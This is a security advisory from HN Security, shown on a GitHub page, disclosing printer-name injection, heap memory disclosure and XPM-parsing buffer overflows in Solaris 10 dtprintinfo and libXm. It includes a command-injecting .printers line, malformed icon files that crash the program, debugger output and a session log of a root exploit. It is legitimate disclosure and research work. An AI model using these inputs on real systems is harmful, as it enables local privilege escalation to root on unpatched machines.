    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fhnsecurity%2Fvulns%2Fblob%2Fmain%2FHNS-2022-01-dtprintinfo.txt)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=hnsecurity%2Fvulns)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[hnsecurity](/hnsecurity)
/
**[vulns](/hnsecurity/vulns)**
Public

* [Notifications](/login?return_to=%2Fhnsecurity%2Fvulns) You must be signed in to change notification settings
* [Fork
  2](/login?return_to=%2Fhnsecurity%2Fvulns)
* [Star
   21](/login?return_to=%2Fhnsecurity%2Fvulns)

* [Code](/hnsecurity/vulns)
* [Issues
  0](/hnsecurity/vulns/issues)
* [Pull requests
  0](/hnsecurity/vulns/pulls)
* [Actions](/hnsecurity/vulns/actions)
* [Projects
  0](/hnsecurity/vulns/projects)
* [Security](/hnsecurity/vulns/security)
* [Insights](/hnsecurity/vulns/pulse)

Additional navigation options

* [Code](/hnsecurity/vulns)
* [Issues](/hnsecurity/vulns/issues)
* [Pull requests](/hnsecurity/vulns/pulls)
* [Actions](/hnsecurity/vulns/actions)
* [Projects](/hnsecurity/vulns/projects)
* [Security](/hnsecurity/vulns/security)
* [Insights](/hnsecurity/vulns/pulse)

## Files

 main
## Breadcrumbs

1. [vulns](/hnsecurity/vulns/tree/main)
/
# HNS-2022-01-dtprintinfo.txt

Copy path Blame  Blame
## Latest commit

## History

[History](/hnsecurity/vulns/commits/main/HNS-2022-01-dtprintinfo.txt)644 lines (532 loc) · 28.1 KB main
## Breadcrumbs

1. [vulns](/hnsecurity/vulns/tree/main)
/
# HNS-2022-01-dtprintinfo.txt

Top
## File metadata and controls

* Code
* Blame

644 lines (532 loc) · 28.1 KB[Raw](https://github.com/hnsecurity/vulns/raw/refs/heads/main/HNS-2022-01-dtprintinfo.txt)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644--[ HNS-2022-01 - HN Security Advisory - https://security.humanativaspa.it/
\* Title: Multiple vulnerabilities in Solaris dtprintinfo and libXm/libXpm\* Products: Common Desktop Environment 1.6, Motif 2.1, X.Org libXpm < 3.5.15\* OS: Oracle Solaris 10 (CPU January 2021)\* Author: Marco Ivaldi <marco.ivaldi@hnsecurity.it>\* Date: 2023-01-18\* Last update: 2023-01-21\* Oracle vulnerability tracking numbers: \* S1597707 - Arbitrary printer name injection \* S1597724 - Heap memory disclosure via long printer names \* S1597711 - Memory corruption via malformed icon files \* S1597730 - Stack-based buffer overflow in libXm ParseColors\* CVE IDs: \* CVE-2022-46285 - Infinite loop on unclosed comments in X.Org libXpm \* CVE-2023-24039 - Stack-based buffer overflow in libXm ParseColors \* CVE-2023-24040 - Printer name injection and heap memory disclosure\* Advisory URLs:  \* https://github.com/hnsecurity/vulns/blob/main/HNS-2022-01-dtprintinfo.txt \* https://lists.x.org/archives/xorg-announce/2023-January/003312.html \* https://lists.x.org/archives/xorg-announce/2023-January/003313.html\* Exploit URLs: \* https://github.com/0xdea/exploits/blob/master/solaris/raptor\_dtprintlibXmas.c
--[ 0 - Table of contents
1 - Summary2 - Vulnerabilities 2.1 - Arbitrary printer name injection 2.2 - Heap memory disclosure via long printer names 2.3 - Memory corruption via malformed icon files 2.4 - Stack-based buffer overflow in libXm ParseColors()3 - Analysis 3.1 - Printer name injection and heap memory disclosure 3.2 - Memory corruption via malformed icon files4 - Exploitation5 - Affected products6 - Remediation7 - Disclosure timeline8 - References
--[ 1 - Summary
"What has been will be again, what has been done will be done again; there is nothing new under the Sun." -- Ecclesiastes 1:9
We have identified multiple security vulnerabilities that are exploitablevia the the setuid-root dtprintinfo binary from the Common DesktopEnvironment (CDE) distributed with Oracle Solaris 10 (CPU January 2021):
\* A bug in the parser of the lpstat external command invoked by dtprintinfo to list the names of available printers allows low-privileged local users to inject arbitrary printer names via the $HOME/.printers file.
\* Printer name injection allows low-privileged local users to manipulate the control flow of the target program and disclose memory contents. Based on our analysis, this bug does not seem to be directly exploitable to achieve arbitrary code execution. However, we recommend treating it as a potential security vulnerability and fix it as such.
\* The ability to inject arbitrary printer names opens other attack vectors that otherwise would not be available on systems without configured printers. As an example, we discovered multiple icon parsing bugs in the Motif library libXm that cause memory corruption.
We demonstrated the possibility to exploit one of these memory corruptionbugs, a stack-based buffer overflow in the ParseColors() function of libXm,to achieve local privilege escalation to root on Solaris 10.
--[ 2 - Vulnerabilities
Following our last CDE vulnerability disclosures [1], Oracle kindly sharedwith us a copy of their then current Solaris 10 security patch set (CPUJanuary 2021), so that we could install it in our lab and verify the fixesfor the bugs we had reported.
In addition to verifying these fixes, we decided to take a closer look atthe dtprintinfo program distributed with CDE, because of its complexity andits impressive historical record of high-impact vulnerabilities [2]. Theseare the results of our research.
--[ 2.1 - Arbitrary printer name injection
After fruitlessly spending a few days reversing and auditing the patchedversion of dtprintinfo, we came up with the idea of using the poor man'sfuzzer below to quickly check for the presence of flaws in the parsing ofthe $HOME/.printers file:
bash-3.2$ cat /dev/urandom > ~/.printers^C
Indeed, this led to immediate results. It turns out that it is possible toinject fake printers to be displayed by dtprintinfo. To do so, we need tocraft a .printers file that contains at least one line in the followingformat:
<string><space>:<\n>
Where <string> can be any string, including most special characters, and<space> can either be a space (0x20) or a tab (0x09) character. Forinstance, the following line will inject a fake printer named "FOO":
FOO :
Since dtprintinfo uses printer names as arguments for some externalcommands that it invokes, it is possible to abuse this flaw to injectarbitrary commands. For instance, to execute an injected command when wedouble-click on a printer icon in the X11 GUI, we can craft a .printersfile that contains lines such as the following (space and tab characterscannot be used in the injected command string for obvious reasons):
FOO;/usr/bin/id>/tmp/pwned; :BAR;/usr/bin/cat</tmp/PAYLOAD; :
Unfortunately for us attackers, dtprintinfo fork()s and permanently dropsroot privileges via setuid() before running external commands. Therefore,the injected commands are executed with regular user privileges. This meanswe can only abuse the described printer name injection bug to trigger anadditional second-order vulnerability, if such a vulnerability exists.Here's a couple of ideas we have experimented with to no avail:
\* Use the "cat<PAYLOAD" pattern above to trigger either an integer overflow, a buffer overflow, or a format string bug.\* Inject a printer name that contains a format string or a directory traversal payload to trigger some other bug down the line.
The third obvious idea is to inject a long printer name and see whathappens. What happened in our case is that we were able to trigger anout-of-bound read and disclose partial heap memory contents of our targetsetuid-root binary.
--[ 2.2 - Heap memory disclosure via long printer names
To reproduce this bug, first craft a malicious .printers file as followsand create a hardlink to it named .printers.new, to prevent renaming by theDtConfigPrinters::renameUserPrinterSelectionFile() method that gets calledwhile dtprintinfo is initializing queues in DtApp::UpdateQueues():
bash-3.2$ echo "FOO;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA; :" > ~/.printersbash-3.2$ ln ~/.printers ~/.printers.new
Then, trace dtprintinfo's execution via a setuid-root truss program to logaccess to interesting memory addresses:
bash-3.2$ export DISPLAY=:0bash-3.2$ truss -fae -u '\*' -u a.out /usr/dt/bin/dtprintinfo -all 2> OUT
At this point, in dtprintinfo's GUI:
\* Select "View" > "Select Printers to Show..." from the menu.\* Select the injected printer to be shown.\* Click on "Apply" and then click on "OK".\* Select "Printers" > "Exit" from the menu, closing dtprintinfo.
Now, examining the .printers file modified by dtprintinfo while it wasrunning, we can notice that it contains non-printable characters, which arein fact leaked heap memory contents. For instance:
bash-3.2$ od -x ~/.printers0000000 615f 6c6c 5c20 460a 4f4f 413b 4141 41410000020 4141 4141 4141 4141 4141 4141 4141 4141\*0001000 4141 4141 4141 4141 4141 3b41 0a2c 41410001020 4141 4141 4141 4141 4141 4141 4141 4141\*0001400 4141 4141 4141 4141 4141 4141 4141 e9480001420 0810 6938 0810 0409 410a 4141 4141 4141 ^^^^^^^^^ << 0x081069380001440 4141 4141 2c3b 000a0001447
By observing the output of truss, we can find the example leaked memoryaddress highlighted above:
-> \_\_0fJContainerLInnerWidgetv(0x8105ea8)<- \_\_0fJContainerLInnerWidgetv() = 0x8106938 ^^^^^^^^^-> libXm:\_XmManagerGetValuesHook(0x8106938, 0xfe6a1820, 0x8047840) ^^^^^^^^^...-> \_\_0fHIconObjNCreateIconObjP6HMotifUIPcNCCPFPv\_vPvNDCP6NIconFieldsRec(0x8106d60, 0x8105ea8, 0x8086c3f, 0x0) -> \_\_0fHMotifUIKGetPixmapsP6K\_WidgetRecPcPUlTD(0x8106d60, 0x8106938, 0xfe62bd00, 0x8106dd0) ^^^^^^^^^
By playing with different printer name lengths between 256 and 1024 bytesand/or clicking on "Apply" or "OK" multiple times, we can leak differentheap memory contents.
The "Set Default" button can be used to cause a similar .printers filecorruption. In addition, instead of injecting a single long printer name,we can trigger the same bug by injecting a long list of regular printernames and selecting them to be shown in dtprintinfo's GUI.
--[ 2.3 - Memory corruption via malformed icon files
The ability to inject arbitrary printer names opens other attack vectorsthat otherwise would not be available on systems without configuredprinters. In fact, only privileged users can create or update printingconfiguration in /etc/printers.conf, usually via /usr/sbin/printmgr or/usr/bin/lpset.
One such vector we thought that was worth exploring is the parsing ofprinter icons in the XPM format [3]. A low-privileged local user can supplyhis or her own icons for dtprintinfo to show by placing them in the$HOME/.dt/icons directory and selecting them in the X11 GUI. A bug in theXPM parser could easily lead to memory corruption and privilege escalation.To prove our point, we built a rudimentary mutation fuzzer written inPython and we unearthed a few icon parsing bugs in the libXm library(/usr/dt/lib/libXm.so.4) used by CDE, that was originally part of the Motiftoolkit [4].
As a starter, the following malformed icon file with an unbalanced commentblock will crash dtprintinfo:
/\* XPM \*/static char \* sample\_xpm[] = {"15 19 6 1"," c None",". c #FFFFFF","+ c #000000","@ c #99FFCC","# c #66CCCC","$ c #339966",/\* CRASH".+++++++++++++.","+@@@@@@@@@@@@#+","+@###########$+","+@###....####$+","+@##......###$+","+@#...$$...##$+","+@#..$$##..$#$+","+@##$$##...$#$+","+@#####...$$#$+","+@####...$$##$+","+@####..$$###$+","+@####..$####$+","+@#####$$####$+","+@####..#####$+","+@####..$####$+","+@#####$$####$+","+@###########$+","+#$$$$$$$$$$$$+",".+++++++++++++."};
To reproduce the crash, inject an arbitrary printer as described earlierand perform the following actions:
\* Craft the malformed XPM icon above in the following files in ~/.dt/icons: crash.l.pm crash.m.pm crash.t.pm\* Launch dtprintinfo with proper command-line options (e.g., -all).\* Select the injected printer, and click on "Selected" > "Properties...".\* Click on "Find Set..." and choose "~/.dt/icons" from the drop-down menu.
After a short while, dtprintinfo should segfault:
Program terminated with signal 11, Segmentation fault.#0 0xfed322c8 in ParseComment () from /usr/dt/lib/libXm.so.4(gdb) x/i $pc0xfed322c8 <ParseComment+186>: mov (%edi),%ah(gdb) i reax 0x8045bff 134503423ecx 0x80456f0 134502128edx 0xfe972be0 -23647264ebx 0xfee90000 -18284544esp 0x8024fbc 0x8024fbcebp 0x8024fdc 0x8024fdcesi 0x7 7edi 0xfeffffff -16777217eip 0xfed322c8 0xfed322c8 <ParseComment+186>...(gdb) bt#0 0xfed322c8 in ParseComment () from /usr/dt/lib/libXm.so.4#1 0xfed321dc in \_XmxpmNextString () from /usr/dt/lib/libXm.so.4#2 0xfed3392a in ParsePixels () from /usr/dt/lib/libXm.so.4#3 0xfed32511 in \_XmxpmParseData () from /usr/dt/lib/libXm.so.4#4 0xfed31e24 in \_XmXpmReadFileToImage () from /usr/dt/lib/libXm.so.4#5 0xfef09ac1 in \_DtXpmReadFileToImage () from /usr/dt/lib/libDtSvc.so.1#6 0xfef09b2b in \_DtXpmReadFileToPixmap () from /usr/dt/lib/libDtSvc.so.1#7 0x08079969 in \_\_0fHMotifUIKGetPixmapsP6K\_WidgetRecPcPUlTD ()#8 0x0807d872 in \_\_0fHIconObjNCreateIconObjP6HMotifUIPcNCCPFPv\_vPvNDCP6NIconFieldsRec ()#9 0x0807d4b2 in \_\_0oHIconObjctP6HMotifUIPcNECP6NIconFieldsRec ()#10 0x08072c21 in \_\_0fJDtFindSetKComboBoxCBP6LComboBoxObjPciT ()#11 0x08075286 in \_\_0fLComboBoxObjISelectCBP6K\_WidgetRecPvTCT ()...
At a glance, this does not look exploitable. A much better-looking crashcan be triggered with the following malformed icon file:
00000000: 2f2a 2058 504d 202a 2f0a 7374 6174 6963 /\* XPM \*/.static00000010: 2063 6861 7220 2a78 6d61 6e5b 5d20 3d20 char \*xman[] =00000020: 7b0a 2f2a 2077 6964 7468 2068 6569 6768 {./\* width heigh00000030: 7420 6e63 6f6c 6f72 7320 6368 6172 735f t ncolors chars\_00000040: 7065 725f 7069 7865 6c20 2a2f 0a22 3820 per\_pixel \*/."800000050: 3820 3320 3122 2c0a 2f2a 2063 6f6c 6f72 8 3 1",./\* color00000060: 7320 2a2f 0a22 6520 6734 2062 6c61 636b s \*/."e g4 black00000070: 2063 2070 616c 6520 7475 7271 756f 6973 c pale turquois00000080: 6520 3422 2c0a 22fe 206d 2077 6869 7465 e 4",.". m white ^^ << this 0xfe byte triggers the crash00000090: 2063 206c 6967 6874 2067 6f6c 6465 6e20 c light golden000000a0: 726f 6420 7965 6c6c 6f77 2067 3420 6772 rod yellow g4 gr000000b0: 6579 222c 0a22 6720 6720 7768 6974 6520 ey",."g g white000000c0: 6320 6c65 6d6f 6e20 6368 6966 666f 6e20 c lemon chiffon000000d0: 6d20 626c 6163 6b22 2c0a 2f2a 2070 6978 m black",./\* pix000000e0: 656c 7320 2a2f 0a22 6565 6565 6565 6565 els \*/."eeeeeeee000000f0: 222c 0a22 6666 6666 6666 6666 222c 0a22 ",."ffffffff",."00000100: 6767 6767 6767 6767 222c 0a22 6767 6767 gggggggg",."gggg00000110: 6767 6767 220a 7d3b 0a gggg".};.
Program terminated with signal 11, Segmentation fault.#0 0x027efed3 in ?? ()(gdb) i reax 0xfe634c80 -27046784ecx 0x3 3edx 0x0 0ebx 0xfee90002 -18284542esp 0x8045668 0x8045668ebp 0x80456d0 0x80456d0esi 0x80460d0 134504656edi 0x80456f0 134502128eip 0x27efed3 0x27efed3...#0 0x027efed3 in ?? ()#1 0xfed3266a in \_XmxpmParseData () from /usr/dt/lib/libXm.so.4#2 0xfed31e24 in \_XmXpmReadFileToImage () from /usr/dt/lib/libXm.so.4#3 0xfef09ac1 in \_DtXpmReadFileToImage () from /usr/dt/lib/libDtSvc.so.1#4 0xfef09b2b in \_DtXpmReadFileToPixmap () from /usr/dt/lib/libDtSvc.so.1#5 0x08079969 in \_\_0fHMotifUIKGetPixmapsP6K\_WidgetRecPcPUlTD ()#6 0x0807d872 in \_\_0fHIconObjNCreateIconObjP6HMotifUIPcNCCPFPv\_vPvNDCP6NIconFieldsRec ()#7 0x0807d4b2 in \_\_0oHIconObjctP6HMotifUIPcNECP6NIconFieldsRec ()#8 0x08072c21 in \_\_0fJDtFindSetKComboBoxCBP6LComboBoxObjPciT ()#9 0x08075286 in \_\_0fLComboBoxObjISelectCBP6K\_WidgetRecPvTCT ()
It looks like we have at least partial control over the eip register! Apromising crash indeed... An interesting variation that can help shed lighton the reasons of this crash can be obtained by replacing the 0xfe bytewith 0xff:
Program terminated with signal 11, Segmentation fault.#0 0xfed20268 in \_XmxpmFreeColorTable@plt () from /usr/dt/lib/libXm.so.4(gdb) x/i $pc0xfed20268 <\_XmxpmFreeColorTable@plt>: jmp \*0x19ec(%ebx)(gdb) i reax 0xfe62d680 -27076992ecx 0x3 3edx 0x0 0ebx 0x20000 131072esp 0x8045668 0x8045668ebp 0x80456d0 0x80456d0esi 0x80460d0 134504656edi 0x80456f0 134502128eip 0xfed20268 0xfed20268 <\_XmxpmFreeColorTable@plt>...#0 0xfed20268 in \_XmxpmFreeColorTable@plt () from /usr/dt/lib/libXm.so.4#1 0xfed3266a in \_XmxpmParseData () from /usr/dt/lib/libXm.so.4#2 0xfed31e24 in \_XmXpmReadFileToImage () from /usr/dt/lib/libXm.so.4#3 0xfeef9ac1 in \_DtXpmReadFileToImage () from /usr/dt/lib/libDtSvc.so.1#4 0xfeef9b2b in \_DtXpmReadFileToPixmap () from /usr/dt/lib/libDtSvc.so.1#5 0x08079969 in \_\_0fHMotifUIKGetPixmapsP6K\_WidgetRecPcPUlTD ()#6 0x0807d872 in \_\_0fHIconObjNCreateIconObjP6HMotifUIPcNCCPFPv\_vPvNDCP6NIconFieldsRec ()#7 0x0807d4b2 in \_\_0oHIconObjctP6HMotifUIPcNECP6NIconFieldsRec ()#8 0x08072c21 in \_\_0fJDtFindSetKComboBoxCBP6LComboBoxObjPciT ()#9 0x08075286 in \_\_0fLComboBoxObjISelectCBP6K\_WidgetRecPvTCT ()
Based on our quick analysis, ebx gets corrupted in ParsePixels() and thenits value is used to calculate a jump location by code in the .plt section.We have not deeply investigated these instances of memory corruption and wehave not seriously fuzzed libXm's XPM parser. We would like to leavefurther exploration of this attack vector, as well as any vulnerabilitiesin other libraries used by dtprintinfo, as an exercise for you, dearreaders. ;)
--[ 2.4 - Stack-based buffer overflow in libXm ParseColors()
After our brief but intense artisanal fuzzing experience, before giving upon dtprintinfo and going for some fancier target, it was time to go back tostatic analysis for a short while, specifically targeting the apparentlyweak libXm library.
We fired up our Rhabdomancer Ghidra script [5] to quickly find locations inthe library where unsafe API functions are called, using them as startingpoints for our binary audit. Among some interesting candidate points, thefollowing one stood up, in the familiar ParseColors() function that we hadalready encountered while analyzing the crashes produced by our XPM fuzzer:
int ParseColors(int \*data, uint ncolors, uint cpp, undefined4 \*colorTablePtr, undefined4 hashtable){ ... char local\_83c[1024]; char local\_43c[1024]; ... local\_c = \_XmxpmNextWord(local\_34, local\_83c, 0x400); ... local\_83c[local\_c] = '\0'; strcat(local\_43c, local\_83c); /\* VULN \*/}
A perfect specimen of stack-based buffer overflow! We have found yetanother memory corruption bug in the parsing of printer icons in the XPMformat. This one has a high likelihood of being exploitable to achievearbitrary code execution and local privilege escalation.
--[ 3 - Analysis
Let's briefly analyze what causes the identified vulnerabilities.
--[ 3.1 - Printer name injection and heap memory disclosure
The arbitrary printer name injection and heap memory disclosure bugs havethe following root causes:
\* The /usr/bin/lpstat external command invoked by dtprintinfo to list the names of available printers has a flawed parser, which allows low-privileged local users to inject arbitrary printer names in the user-controllable $HOME/.printers file:
 bash-3.2$ cat ~/.printers FOO;AAA; : bash-3.2$ lpstat -v system for FOO;AAA;: (null) (as lpd://(null)/printers/)
 From our point of view, this in itself is not a big deal. Since lpstat is executed after dropping privileges, we could in theory inject our own code into this process anyway and control its behavior. For this reason, we have not investigated lpstat any further. The real problem here is architectural: dtprintinfo's functionality should be self-contained and should not depend on external programs. This is not a robust design and has led to more impactful vulnerabilities in the past [6].
\* The dtprintinfo program blindly trusts the output of lpstat without validating it. This allows low-privileged local users to craft potentially dangerous inputs (such as printer names that are expected to be in a consistent format), thus altering its behavior.
\* Finally, the DtConfigPrinters::UpdateMainPrtList() method called by the DtConfigPrinters::ApplyCB() and DtConfigPrinters::OkCB() callback methods, when updating the .printers file, writes some additional bytes after the actual printer names, thus corrupting the file contents. This is caused by the fact that the DtConfigPrinters::readContinuedLine() method called by DtConfigPrinters::UpdateMainPrtList() does not terminate the returned buffer if it reads a line longer than 256 bytes that does not contain a '\n' character. This non-terminated, heap-allocated buffer is later passed to fprintf(), which then writes some characters that reside past the logical end of the buffer to the .printers file, until a NUL byte is found. This is how we get the observed memory disclosure.
Based on our analysis, the described memory disclosure bug does not seem tobe directly exploitable to achieve arbitrary code execution and localprivilege escalation. However, as usual, feel free to prove us wrong! Allconsidered, we recommend treating this bug as a potential securityvulnerability and fixing it as such.
--[ 3.2 - Memory corruption via malformed icon files
The stack-based buffer overflow in the ParseColors() function of libXm iscaused by the unchecked use of the unsafe API function strcat(). Thisvulnerability can be triggered via a specially crafted XPM icon with longcolor strings.
We have not spent much time analyzing the root causes of the crashesreported by our XPM fuzzer. We recommend extensively auditing and fuzzinglibXm and the other libraries distributed with CDE that are used byprivileged programs. A quick manual audit and a few runs of our rudimentarymutation fuzzer were enough to discover some shallow and dangerous memorycorruption bugs in the XPM parser. We expect more bugs to be present insuch ancient code.
--[ 4 - Exploitation
We have created a proof-of-concept exploit [7] that chains together theprinter name injection bug and the stack-based buffer overflow we haveidentified in libXm. It allows a low-privileged local user to escalate hisor her privileges to those of the root user on Intel-based Solaris 10systems with the latest patches installed (tested on CPU January 2021).
The exploit code is extensively commented and should be self-explanatory.An example attack session follows:
$ uname -aSunOS nostalgia 5.10 Generic\_153154-01 i86pc i386 i86pc$ iduid=54322(raptor) gid=1(other)$ gcc raptor\_dtprintlibXmas.c -o raptor\_dtprintlibXmas -Wall$ ./raptor\_dtprintlibXmas 10.0.0.109:0raptor\_dtprintlibXmas.c - Solaris 10 CDE #ForeverDay LPECopyright (c) 2023 Marco Ivaldi <raptor@0xdeadbeef.info>
Using SI\_PLATFORM : i86pc (5.10)Using stack base : 0x8047fffUsing safe address : 0x8045790Using rwx\_mem address : 0xfeffa004Using sc address : 0x8047facUsing sprintf() address : 0xfefd1250Path of target binary : /usr/dt/bin/dtprintinfo
# iduid=0(root) gid=1(other)
Our exploit uses dtprintinfo as an attack vector to abuse one of thevulnerabilities we discovered in libXm and escalate privileges to root.Other vectors are potentially available to local and remote attackers, suchas other setuid or setgid binaries, daemons, and client applications thatuse of the vulnerable library. As an example, the dticon application hasbeen confirmed to be affected by our stack-based buffer overflow.
--[ 5 - Affected products
The Common Desktop Environment 1.6 and Motif 2.1 distributed with OracleSolaris 10 are affected by the vulnerabilities discussed in this advisory.All tests were conducted on the following Solaris 10 system, patched withCPU January 2021:
bash-3.2$ showrev -aHostname: nostalgiaHostid: 367f0939Release: 5.10Kernel architecture: i86pcApplication architecture: i386Kernel version: SunOS 5.10 Generic\_153154-01OpenWindows version: Solaris X11 Version 6.6.2 14 August 2019...
Solaris 10 for the SPARC architecture and older versions of the Solarisoperating system are also likely vulnerable.
Oracle Solaris 11.4 does not ship CDE or Motif by default. In addition, inthe xpmParseColors() function of the libXpm library shipped with Solaris11.4, calls to the unsafe strcat() API function were replaced with calls tostrlcat(), which if used properly prevents buffer overflows. Solaris 11.4in its default configuration and libXpm are only affected by the firstcrash we identified, caused by an unbalanced comment block. Please notethat we have not conducted an audit on libXpm, which may contain otherbugs.
CDE 2.5.1 [8] is the latest version (at the time of this writing) of theopen-source fork of the Common Desktop Environment. Following our previousvulnerability disclosures, their dtprintinfo binary is not installedsetuid-root anymore. Therefore, CDE 2.5.1 is not directly affected by thevulnerabilities discussed in this advisory. Please note that we have notconducted an audit on the open-source CDE's codebase, which may containother bugs.
Motif 2.3.8 [9] is the latest version (at the time of this writing) of theopen-source Motif project that includes the libXm library. In thexpmParseColors() function, calls to the unsafe strcat() API function werereplaced with calls to the STRLCAT() macro, which if used properly preventsbuffer overflows. Therefore, Motif 2.3.8 is not affected by thevulnerabilities discussed in this advisory. Please note that we have notconducted an audit on Motif's codebase, which may contain other bugs.
--[ 6 - Remediation
Oracle assigned the following tracking numbers to our vulnerabilityreports:
\* S1597707 - Arbitrary printer name injection\* S1597724 - Heap memory disclosure via long printer names\* S1597711 - Memory corruption via malformed icon files\* S1597730 - Stack-based buffer overflow in libXm ParseColors
No fixes have been issued for Solaris 10. See the disclosure timeline belowfor further details.
As a partial workaround, it is possible to remove the setuid bit from thedtprintinfo binary as follows (note that this might prevent it from workingproperly):
bash-3.2# chmod -s /usr/dt/bin/dtprintinfo
--[ 7 - Disclosure timeline
2022-01-18: Oracle was notified via <secalert\_us@oracle.com>.2022-01-19: Oracle acknowledged our vulnerability reports.2022-04-20: Asked Oracle to provide an update on the patch release date.2022-04-21: Oracle replied they could not comment on the patch release date. 2022-09-03: Asked Oracle for an update and informed them of our plan to publish a detailed advisory and a blog post before the end of 2022.2022-09-12: Oracle replied they are working on the bugs and will be able to give an update closer to the next CPU, scheduled for October.2022-10-18: Oracle informed us that the vulnerabilities will be fixed in their CPU of January 2023.2022-12-20: With a surprise move, Oracle informed us that Solaris 10 desktop components have reached EOL and are no longer supported. Therefore, Oracle will not be releasing patches for bugs affecting Solaris 10. They will work with X.Org to get a fix and an advisory released upstream for the first crash we identified in libXm, which also affects X.Org libXpm. This denial of service bug will be fixed in Solaris 11.4. As a final note, it appears that the buffer overflows we discovered in ParsePixels() and ParseColors() were already reported by Chris Evans in 2004 and tracked as CVE-2004-0687 (https://security.appspot.com/security/CESA-2004-003.txt). Due to an incomplete fix, they were not patched in Solaris 10 and have survived in the code for 19 years! Since no patches for Solaris 10 will be released, these issues have officially become #ForeverDay bugs.2023-01-17: X.Org released libXpm 3.5.15, which fixes CVE-2022-46285 (infinite loop on unclosed comments in X.Org libXpm). Oracle published their CPU January 2023, which unfortunately does not include fixes for our bugs that affect Solaris 10.2023-01-18: Oracle informed us that Solaris 10 desktop components have reached EOL at the end of 2019. EOL is documented in support note 1400676.1, behind the paywall for Oracle's customers with current support contracts. HN Security published this advisory and a local privilege escalation exploit.2023-01-20: Mitre has assigned CVE-2023-24039 to the buffer overflow in  libXm and CVE-2023-24040 to the printer name injection and heap memory disclosure bugs.
--[ 8 - References
